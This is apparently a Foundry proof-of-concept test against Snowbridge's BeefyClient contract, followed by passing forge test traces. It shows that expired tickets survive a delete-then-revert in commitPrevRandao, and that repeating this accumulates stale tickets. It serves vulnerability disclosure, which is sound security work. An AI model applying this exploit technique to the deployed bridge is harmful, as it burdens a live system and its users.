pragma solidity ^0.8.28;
import "forge-std/Test.sol";
import "../src/BeefyClient.sol";
import "../src/utils/ScaleCodec.sol"; // for re-encoding commitment bytes exactly like the contract
contract BeefyClient_ExpiredTicket_Test is Test {
    BeefyClient beefy;
    address validator;
    uint256 validatorPK;
    address relayer;
    function setUp() public {
        validatorPK = 0xA11CE;
        validator = vm.addr(validatorPK);
        relayer = vm.addr(0xBEEF);
        BeefyClient.ValidatorSet memory cur;
        cur.id = 1;
        cur.length = 1;
        cur.root = keccak256(abi.encodePacked(validator));
        BeefyClient.ValidatorSet memory nxt;
        nxt.id = 2;
        nxt.length = 1;
        nxt.root = bytes32(uint256(0xDEAD));
        beefy = new BeefyClient({
            _randaoCommitDelay: 1,
            _randaoCommitExpiration: 1,
            _minNumRequiredSignatures: 1,
            _initialBeefyBlock: 0,
            _initialValidatorSet: cur,
            _nextValidatorSet: nxt
        });
    }
    // --- Helpers (mirror BeefyClient's internal encoders) ---
    function _encodeCommitment(BeefyClient.Commitment memory c)
        internal
        pure
        returns (bytes memory)
    {
        return bytes.concat(
            _encodeCommitmentPayload(c.payload),
            ScaleCodec.encodeU32(c.blockNumber),
            ScaleCodec.encodeU64(c.validatorSetID)
        );
    }
    function _encodeCommitmentPayload(BeefyClient.PayloadItem[] memory items)
        internal
        pure
        returns (bytes memory)
    {
        bytes memory payload = ScaleCodec.checkedEncodeCompactU32(items.length);
        for (uint256 i = 0; i < items.length; i++) {
            payload = bytes.concat(
                payload,
                items[i].payloadID,
                ScaleCodec.checkedEncodeCompactU32(items[i].data.length),
                items[i].data
            );
        }
        return payload;
    }
    function _makeBitfield(uint256 len, uint256[] memory setBits)
        internal
        pure
        returns (uint256[] memory bitfield)
    {
        uint256 containers = (len + 255) / 256; // same as Bitfield.containerLength(len)
        bitfield = new uint256[](containers);
        for (uint256 i = 0; i < setBits.length; i++) {
            uint256 idx = setBits[i];
            bitfield[idx / 256] |= (uint256(1) << (idx % 256));
        }
    }
    function _ticketID(address who, bytes32 commitmentHash) internal pure returns (bytes32) {
        // Same as createTicketID(account, commitmentHash) in BeefyClient (abi.encode padding)
        return keccak256(abi.encode(who, commitmentHash));
    }
function _single(uint256 x) internal pure returns (uint256[] memory arr) {
    arr = new uint256[](1);
    arr[0] = x;
}
    // ------------------------------
    // exploit 1: single expired ticket isn't deleted (delete + revert)
    // ------------------------------
    function test_ExpiredTicketIsNotDeleted_dueToDeleteThenRevert() public {
        // 1) a valid commitment signed by the validator in the current set (id=1)
        BeefyClient.Commitment memory C;
        C.blockNumber = 1; // > latestBeefyBlock (0)
        C.validatorSetID = 1;
        C.payload = new BeefyClient.PayloadItem[](0); // payload not validated in submitInitial
        bytes32 commitmentHash = keccak256(_encodeCommitment(C));
        // one valid ECDSA signature for submitInitial (protocol requires just one here)
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPK, commitmentHash);
        BeefyClient.ValidatorProof memory proof;
        proof.v = v;
        proof.r = r;
        proof.s = s;
        proof.index = 0; // leaf index in vset
        proof.account = validator; // validator address
        proof.proof = new bytes32[](0); // width=1 -> empty proof is valid
        // bitfield must claim >= quorum; for length=1, quorum=1, so set bit 0
        uint256[] memory bitfield = _makeBitfield(1, _single(0));
        // 2) submitInitial -> creates a ticket
        vm.prank(relayer);
        beefy.submitInitial(C, bitfield, proof);
        bytes32 id = _ticketID(relayer, commitmentHash);
        (uint64 bn,, , uint256 prevBefore, ) = beefy.tickets(id);
        assertGt(bn, 0, "ticket must exist after submitInitial");
        assertEq(prevBefore, 0, "prevRandao unset before commit");
        // 3) jump past delay + expiry and call commitPrevRandao -> triggers delete + revert (bug)
        vm.roll(block.number + 3);
        vm.prank(relayer);
        vm.expectRevert(BeefyClient.TicketExpired.selector);
        beefy.commitPrevRandao(commitmentHash);
        // 4) impact: deletion didn't persist because revert unwinds state; ticket remains
        (uint64 bn2,, , uint256 prevAfter, ) = beefy.tickets(id);
        assertGt(bn2, 0, "expired ticket was NOT deleted due to revert");
        assertEq(prevAfter, 0, "prevRandao still zero (stuck)");
        // ticket cannot progress: submitFinal fails at validateTicket (PrevRandaoNotCaptured)
        BeefyClient.ValidatorProof[] memory emptyProofs = new BeefyClient.ValidatorProof[](0);
        BeefyClient.MMRLeaf memory dummyLeaf;
        vm.prank(relayer);
        vm.expectRevert(BeefyClient.PrevRandaoNotCaptured.selector);
        beefy.submitFinal(C, bitfield, emptyProofs, dummyLeaf, new bytes32[](0), 0);
    }
    // ------------------------------
    // exploit 2: spray multiple distinct tickets -> persistent state bloat
    // ------------------------------
    function test_SprayingExpiredTickets_accumulatesPermanentEntries() public {
        uint256 N = 3;
        bytes32[] memory ids = new bytes32[](N);
        // N tickets (distinct commitment hashes by varying blockNumber)
        for (uint256 i = 0; i < N; i++) {
            BeefyClient.Commitment memory C;
            C.blockNumber = uint32(1 + i);
            C.validatorSetID = 1;
            C.payload = new BeefyClient.PayloadItem[](0);
            bytes32 commitmentHash = keccak256(_encodeCommitment(C));
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPK, commitmentHash);
            BeefyClient.ValidatorProof memory proof;
            proof.v = v; proof.r = r; proof.s = s;
            proof.index = 0; proof.account = validator;
            proof.proof = new bytes32[](0);
            uint256[] memory bitfield = _makeBitfield(1, _single(0));
            vm.prank(relayer);
            beefy.submitInitial(C, bitfield, proof);
            ids[i] = _ticketID(relayer, commitmentHash);
        }
        // expire and trigger the buggy delete+revert path on each
        vm.roll(block.number + 10);
        for (uint256 i = 0; i < N; i++) {
            BeefyClient.Commitment memory C;
            C.blockNumber = uint32(1 + i);
            C.validatorSetID = 1;
            C.payload = new BeefyClient.PayloadItem[](0);
            bytes32 commitmentHash = keccak256(_encodeCommitment(C));
            vm.prank(relayer);
            vm.expectRevert(BeefyClient.TicketExpired.selector);
            beefy.commitPrevRandao(commitmentHash);
        }
        // all expired tickets still exist -> unbounded, permanent accumulation
        for (uint256 i = 0; i < N; i++) {
            (uint64 bn,, , , ) = beefy.tickets(ids[i]);
            assertGt(bn, 0, "each expired ticket should persist (not deleted)");
        }
    }
}





root@Gandhi:/home/gajnithehero/Desktop/Targets/snowbridge/contracts# forge test  --match-path test/test.sol -vvvv
Warning: Found unknown `etherscan` config for profile `production` defined in foundry.toml.
[⠒] Compiling...
No files changed, compilation skipped

Ran 2 tests for test/test.sol:BeefyClient_ExpiredTicket_Test
[PASS] test_ExpiredTicketIsNotDeleted_dueToDeleteThenRevert() (gas: 95369)
Traces:
  [124477] BeefyClient_ExpiredTicket_Test::test_ExpiredTicketIsNotDeleted_dueToDeleteThenRevert()
    ├─ [0] VM::sign("<pk>", 0x5dae93bba5af14e1d4b0254a35e462833c06a89679ce17b52834ab8fa4360858) [staticcall]
    │   └─ ← [Return] 27, 0x2b059df0502c1af42c7e86137bd7f97c91dad7cecc19ef98d94b0911bf0937b3, 0x35c10f90e3696328b7ef72407c7a8f1ad1d4eb4aa64ee16246aa642e277b2a93
    ├─ [0] VM::prank(0x6E9972213BF459853FA33E28Ab7219e9157C8d02)
    │   └─ ← [Return]
    ├─ [93291] BeefyClient::submitInitial(Commitment({ blockNumber: 1, validatorSetID: 1, payload: [] }), [1], ValidatorProof({ v: 27, r: 0x2b059df0502c1af42c7e86137bd7f97c91dad7cecc19ef98d94b0911bf0937b3, s: 0x35c10f90e3696328b7ef72407c7a8f1ad1d4eb4aa64ee16246aa642e277b2a93, index: 0, account: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7, proof: [] }))
    │   ├─ [3000] PRECOMPILES::ecrecover(0x5dae93bba5af14e1d4b0254a35e462833c06a89679ce17b52834ab8fa4360858, 27, 19459376777411120053077111149811802333166073231466409558972005425027509467059, 24313689890792112733397394298157421274447687300447727290875492489419424475795) [staticcall]
    │   │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
    │   ├─ emit NewTicket(relayer: 0x6E9972213BF459853FA33E28Ab7219e9157C8d02, blockNumber: 1)
    │   └─ ← [Stop]
    ├─ [907] BeefyClient::tickets(0x5930ae47cd431a4a86c8f6a8d44f4ba83bd0d1ea01cdfbb65676479ef4cd6c0f) [staticcall]
    │   └─ ← [Return] 1, 1, 1, 0, 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
    ├─ [0] VM::roll(4)
    │   └─ ← [Return]
    ├─ [0] VM::prank(0x6E9972213BF459853FA33E28Ab7219e9157C8d02)
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(custom error 0xc31eb0e0: 40d3544700000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ [1698] BeefyClient::commitPrevRandao(0x5dae93bba5af14e1d4b0254a35e462833c06a89679ce17b52834ab8fa4360858)
    │   └─ ← [Revert] TicketExpired()
    ├─ [907] BeefyClient::tickets(0x5930ae47cd431a4a86c8f6a8d44f4ba83bd0d1ea01cdfbb65676479ef4cd6c0f) [staticcall]
    │   └─ ← [Return] 1, 1, 1, 0, 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
    ├─ [0] VM::prank(0x6E9972213BF459853FA33E28Ab7219e9157C8d02)
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(custom error 0xc31eb0e0: 78ef3a4700000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ [3085] BeefyClient::submitFinal(Commitment({ blockNumber: 1, validatorSetID: 1, payload: [] }), [1], [], MMRLeaf({ version: 0, parentNumber: 0, parentHash: 0x0000000000000000000000000000000000000000000000000000000000000000, nextAuthoritySetID: 0, nextAuthoritySetLen: 0, nextAuthoritySetRoot: 0x0000000000000000000000000000000000000000000000000000000000000000, parachainHeadsRoot: 0x0000000000000000000000000000000000000000000000000000000000000000 }), [], 0)
    │   └─ ← [Revert] PrevRandaoNotCaptured()
    └─ ← [Stop]

[PASS] test_SprayingExpiredTickets_accumulatesPermanentEntries() (gas: 207037)
Traces:
  [264062] BeefyClient_ExpiredTicket_Test::test_SprayingExpiredTickets_accumulatesPermanentEntries()
    ├─ [0] VM::sign("<pk>", 0x5dae93bba5af14e1d4b0254a35e462833c06a89679ce17b52834ab8fa4360858) [staticcall]
    │   └─ ← [Return] 27, 0x2b059df0502c1af42c7e86137bd7f97c91dad7cecc19ef98d94b0911bf0937b3, 0x35c10f90e3696328b7ef72407c7a8f1ad1d4eb4aa64ee16246aa642e277b2a93
    ├─ [0] VM::prank(0x6E9972213BF459853FA33E28Ab7219e9157C8d02)
    │   └─ ← [Return]
    ├─ [93291] BeefyClient::submitInitial(Commitment({ blockNumber: 1, validatorSetID: 1, payload: [] }), [1], ValidatorProof({ v: 27, r: 0x2b059df0502c1af42c7e86137bd7f97c91dad7cecc19ef98d94b0911bf0937b3, s: 0x35c10f90e3696328b7ef72407c7a8f1ad1d4eb4aa64ee16246aa642e277b2a93, index: 0, account: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7, proof: [] }))
    │   ├─ [3000] PRECOMPILES::ecrecover(0x5dae93bba5af14e1d4b0254a35e462833c06a89679ce17b52834ab8fa4360858, 27, 19459376777411120053077111149811802333166073231466409558972005425027509467059, 24313689890792112733397394298157421274447687300447727290875492489419424475795) [staticcall]
    │   │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
    │   ├─ emit NewTicket(relayer: 0x6E9972213BF459853FA33E28Ab7219e9157C8d02, blockNumber: 1)
    │   └─ ← [Stop]
    ├─ [0] VM::sign("<pk>", 0x108218e723fcc011b10dde867a62a63cb69be5a4ddf7e304f1cbe359cea8b84f) [staticcall]
    │   └─ ← [Return] 28, 0xbbc1c8668e288b69302a2c5a18ee4dfe4740e47d248423bc695dd93b4024181c, 0x518d2a8e0031a389887ad71fc3bae0516d2e6bdec1b75114cabe21f617328233
    ├─ [0] VM::prank(0x6E9972213BF459853FA33E28Ab7219e9157C8d02)
    │   └─ ← [Return]
    ├─ [61391] BeefyClient::submitInitial(Commitment({ blockNumber: 2, validatorSetID: 1, payload: [] }), [1], ValidatorProof({ v: 28, r: 0xbbc1c8668e288b69302a2c5a18ee4dfe4740e47d248423bc695dd93b4024181c, s: 0x518d2a8e0031a389887ad71fc3bae0516d2e6bdec1b75114cabe21f617328233, index: 0, account: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7, proof: [] }))
    │   ├─ [3000] PRECOMPILES::ecrecover(0x108218e723fcc011b10dde867a62a63cb69be5a4ddf7e304f1cbe359cea8b84f, 28, 84924887282727985450717103137403758909309939160635272130247704466948970780700, 36886759873057741812818237825776210892862446696136234603052454807119145894451) [staticcall]
    │   │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
    │   ├─ emit NewTicket(relayer: 0x6E9972213BF459853FA33E28Ab7219e9157C8d02, blockNumber: 2)
    │   └─ ← [Stop]
    ├─ [0] VM::sign("<pk>", 0x5e3b7260e3e217b9e17beabdeb41c38f37ab8babb0c9b7195962dd3d55a623d9) [staticcall]
    │   └─ ← [Return] 28, 0xa2ac23ca5b82adbbf2a5554b4280c4036ac6f4f453c295adfb027183199c36ff, 0x7ab1723c99aeceeb248035490ec99c3841fd87fc949c871f203df8d996e859bf
    ├─ [0] VM::prank(0x6E9972213BF459853FA33E28Ab7219e9157C8d02)
    │   └─ ← [Return]
    ├─ [61396] BeefyClient::submitInitial(Commitment({ blockNumber: 3, validatorSetID: 1, payload: [] }), [1], ValidatorProof({ v: 28, r: 0xa2ac23ca5b82adbbf2a5554b4280c4036ac6f4f453c295adfb027183199c36ff, s: 0x7ab1723c99aeceeb248035490ec99c3841fd87fc949c871f203df8d996e859bf, index: 0, account: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7, proof: [] }))
    │   ├─ [3000] PRECOMPILES::ecrecover(0x5e3b7260e3e217b9e17beabdeb41c38f37ab8babb0c9b7195962dd3d55a623d9, 28, 73578826182299578075329622875403691781468857043431921654250736963668682749695, 55495687890489300139975690970799408859713773606723577065115731727768292448703) [staticcall]
    │   │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
    │   ├─ emit NewTicket(relayer: 0x6E9972213BF459853FA33E28Ab7219e9157C8d02, blockNumber: 3)
    │   └─ ← [Stop]
    ├─ [0] VM::roll(11)
    │   └─ ← [Return]
    ├─ [0] VM::prank(0x6E9972213BF459853FA33E28Ab7219e9157C8d02)
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(custom error 0xc31eb0e0: 40d3544700000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ [1698] BeefyClient::commitPrevRandao(0x5dae93bba5af14e1d4b0254a35e462833c06a89679ce17b52834ab8fa4360858)
    │   └─ ← [Revert] TicketExpired()
    ├─ [0] VM::prank(0x6E9972213BF459853FA33E28Ab7219e9157C8d02)
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(custom error 0xc31eb0e0: 40d3544700000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ [1698] BeefyClient::commitPrevRandao(0x108218e723fcc011b10dde867a62a63cb69be5a4ddf7e304f1cbe359cea8b84f)
    │   └─ ← [Revert] TicketExpired()
    ├─ [0] VM::prank(0x6E9972213BF459853FA33E28Ab7219e9157C8d02)
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(custom error 0xc31eb0e0: 40d3544700000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ [1698] BeefyClient::commitPrevRandao(0x5e3b7260e3e217b9e17beabdeb41c38f37ab8babb0c9b7195962dd3d55a623d9)
    │   └─ ← [Revert] TicketExpired()
    ├─ [907] BeefyClient::tickets(0x5930ae47cd431a4a86c8f6a8d44f4ba83bd0d1ea01cdfbb65676479ef4cd6c0f) [staticcall]
    │   └─ ← [Return] 1, 1, 1, 0, 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
    ├─ [907] BeefyClient::tickets(0xb2bab40bebdf12e9c9e6498c251f908e64131963d12a5c0587e91920332d6664) [staticcall]
    │   └─ ← [Return] 1, 1, 1, 0, 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
    ├─ [907] BeefyClient::tickets(0x95633a636ee1d7c790a4837854b8f8a0dfc88a3bf8895a88d304ea918100d488) [staticcall]
    │   └─ ← [Return] 1, 1, 1, 0, 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
    └─ ← [Stop]

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 36.44ms (32.98ms CPU time)

Ran 1 test suite in 60.62ms (36.44ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
